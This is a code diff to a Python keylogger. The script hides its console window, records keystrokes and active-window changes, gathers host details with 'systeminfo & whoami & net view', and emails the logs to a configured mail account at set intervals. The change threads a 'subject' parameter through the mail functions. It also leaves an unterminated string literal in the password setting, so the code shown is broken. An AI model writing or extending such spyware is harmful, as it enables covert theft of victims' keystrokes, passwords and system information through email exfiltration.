@@ -11,7 +11,7 @@ logdata = ''
 timereport = time.ctime()
 firstreport = 0
 
-def checklog(gserver , gport , guser , gpass , mailfrom,  mailto ):
+def checklog(gserver , gport , guser , gpass , mailfrom,  mailto, subject):
     global logdata,timereport,interval,firstreport
     if firstreport == 0 :
         logdata = os.popen('systeminfo & whoami & net view').read()
@@ -22,7 +22,7 @@ def checklog(gserver , gport , guser , gpass , mailfrom,  mailto ):
         if len(logdata) > 30 :
             msg = logdata
             logdata = ''
-            sendmail.sendmailg(gserver , gport , guser, gpass , mailfrom , mailto , msg , 0)
+            sendmail.sendmailg(gserver , gport , guser, gpass , mailfrom , mailto , subject ,msg , 0)
         time.sleep(60 * interval)
 
 def onpressevent(key):
@@ -48,11 +48,11 @@ def startkeylogger():
     with kbdlisten :
         kbdlisten.join()
 
-def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto):
+def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto,subject):
 	wg.ShowWindow(wc.GetConsoleWindow(),0);
 	wtthread = thread5.Thread(target=Checkifwindowchanged)
 	kthread = thread5.Thread(target=startkeylogger)
-	mailthread = thread5.Thread(target=checklog , args=(gserver , gport , guser , gpass , mailfrom,  mailto))
+	mailthread = thread5.Thread(target=checklog , args=(gserver , gport , guser , gpass , mailfrom,  mailto, subject))
 	kthread.start()
 	wtthread.start()
 	mailthread.start()
@@ -64,8 +64,8 @@ interval = 2
 gserver = ''
 gport = ''
 guser = ''
-gpass = ''
+gpass = '''
 mailfrom = ''
 mailto = ''
 subject = 'report '
-runobjects(gserver , gport , guser , gpass , mailfrom,  mailto)
+runobjects(gserver , gport , guser , gpass , mailfrom,  mailto, subject)
